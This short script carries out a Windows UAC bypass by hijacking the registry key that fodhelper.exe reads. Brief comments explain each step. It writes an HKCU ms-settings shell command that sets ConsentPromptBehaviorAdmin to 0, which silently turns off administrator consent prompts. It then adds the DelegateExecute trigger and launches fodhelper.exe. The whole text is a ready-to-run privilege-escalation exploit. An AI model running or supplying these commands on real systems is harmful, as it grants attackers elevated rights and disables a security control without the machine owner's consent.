#Writing registry for hijacking.

REG ADD "HKCU\SOFTWARE\Classes\ms-settings\shell\open\command" /t REG_SZ /d "C:\windows\system32\cmd.exe /c REG ADD HKLM\software\microsoft\windows\currentversion\policies\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f" /f

#Writing the registry to trigger executable to read from registry. Existence of this key is enough for it.

REG ADD "hkcu\software\classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d " " /f

#executing. (This is in system32, it wont run if youre running it from a 32-bit application)
fodhelper.exe
